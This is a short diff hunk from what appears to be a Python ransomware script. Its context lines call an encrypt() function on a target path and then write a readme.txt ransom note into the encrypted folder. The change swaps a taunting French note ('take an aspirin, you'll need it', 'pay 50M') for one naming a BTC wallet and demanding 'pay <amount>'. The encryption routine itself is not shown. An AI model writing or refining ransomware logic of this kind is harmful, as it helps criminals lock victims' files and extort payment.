@@ -71,5 +71,5 @@ if __name__ == '__main__':
     encrypt(full_path, key)
 
     with open(path_to_encrypt + '/readme.txt', 'w') as file:
-        file.write('prend un aspirine tu vas en avoir besoin \n')
-        file.write('paye 50M    ')
+        file.write('here is my BTC wallet =>  \n')
+        file.write('pay <amount> ')
